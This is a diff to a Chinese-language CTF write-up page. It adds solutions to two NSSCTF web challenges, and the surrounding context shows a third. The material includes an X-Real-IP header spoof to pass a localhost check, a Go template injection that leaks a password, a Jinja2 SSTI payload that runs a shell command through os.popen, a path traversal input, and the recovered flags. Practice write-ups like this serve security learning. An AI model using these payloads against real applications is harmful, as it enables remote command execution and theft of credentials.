@@ -205,6 +205,20 @@
 <p><code>theme=../../../../../../../../../../../flag</code></p>
 <p>一万层目录穿越一把梭.</p>
 <p>flag: <code>NSSCTF&#123;1bdb7278-fdd4-4e35-af6d-f647be26cda5&#125;</code></p>
+<h3 id="NSSCTF-SCTF-2021-loginme"><a href="#NSSCTF-SCTF-2021-loginme" class="headerlink" title="NSSCTF [SCTF 2021] loginme"></a>NSSCTF [SCTF 2021] loginme</h3><p>代码审计 + 模板注入</p>
+<p>提示我们 flag 在 password 里面</p>
+<p>需要用本地地址访问才可以进入可以 ssti 的页面</p>
+<p>Request 里面加个 <code>X-Real-IP: 127.0.0.1</code> 即可</p>
+<p><code>/id=0&amp;age=&#123;&#123;.Password&#125;&#125;</code> 得到 flag</p>
+<p>flag: <code>SCTF&#123;E@zy_SIGn_Ch3eR!&#125;</code></p>
+<h3 id="NSSCTF-NCTF-2018-Flask-PLUS"><a href="#NSSCTF-NCTF-2018-Flask-PLUS" class="headerlink" title="NSSCTF [NCTF 2018] Flask PLUS"></a>NSSCTF [NCTF 2018] Flask PLUS</h3><p>一个不明所以的页面。</p>
+<p>点击底下切换 demo 时有报错</p>
+<p>发现报错信息里含有请求的网址，猜测存在 ssti</p>
+<p>测试：</p>
+<p><img src="/../resources/images/2024-12_assert/11.webp"></p>
+<p>用之前发现的一个神奇 payload 一把梭：</p>
+<p><code>&#123;&#123;lipsum.__globals__['o'+'s']['pop''en']('ls /').read()&#125;&#125;</code></p>
+<p><img src="/../resources/images/2024-12_assert/12.webp"></p>
 <h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="NSSCTF-UTCTF-2020-Observe-closely"><a href="#NSSCTF-UTCTF-2020-Observe-closely" class="headerlink" title="NSSCTF [UTCTF 2020] Observe closely"></a>NSSCTF [UTCTF 2020] Observe closely</h3><p>下载后得到一张图片，分辨率和大小对应不上，猜测藏了东西</p>
 <p>010 Editor 打开，在文件末尾发现：</p>
 <p><img src="/../resources/images/2024-12_assert/6.webp"></p>
